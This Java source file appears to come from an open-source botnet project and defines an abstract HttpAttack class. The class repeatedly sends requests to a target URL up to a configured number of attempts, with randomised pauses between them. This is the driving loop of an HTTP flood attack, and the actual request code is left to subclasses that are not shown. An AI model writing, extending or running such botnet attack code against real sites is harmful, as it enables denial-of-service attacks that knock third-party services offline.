/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.attack;

import com.acmutv.botnet.core.target.HttpTarget;
import com.acmutv.botnet.tool.random.RandomGenerator;
import lombok.AllArgsConstructor;
import lombok.Getter;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.net.URL;
import java.util.Random;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes the behaviour of a HTTP attack.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see HttpGetAttack
 * @see HttpPostAttack
 * @see HttpTarget
 */
@Getter
@AllArgsConstructor
public abstract class HttpAttack implements Runnable {

  private static final Logger LOGGER = LogManager.getLogger(HttpAttack.class);

  private HttpTarget target;
  private Random rndgen;

  @Override
  public void run() {
    final URL url = this.getTarget().getUrl();
    final long maxAttempts = this.getTarget().getMaxAttempts();
    final int sleepAmountMin = this.getTarget().getPeriod().getMin();
    final int sleepAmountMax = this.getTarget().getPeriod().getMax();
    final TimeUnit sleepUnit = this.getTarget().getPeriod().getUnit();

    for (long i = 0; i < maxAttempts; i++) {
      try {
        this.makeAttack(url);
      } catch (IOException e) {
        LOGGER.error(e.getMessage());
        return;
      }
      final long sleepAmount = RandomGenerator.getRandomInt(sleepAmountMin, sleepAmountMax, this.getRndgen());
      this.sleep(sleepAmount, sleepUnit);
    }
  }

  protected abstract void makeAttack(final URL url) throws IOException;

  private void sleep(final long amount, final TimeUnit unit) {
    LOGGER.traceEntry("amount={} unit={}", amount, unit);
    try {
      unit.sleep(amount);
    } catch (InterruptedException e) {
      LOGGER.error(e.getMessage());
    }
  }
}
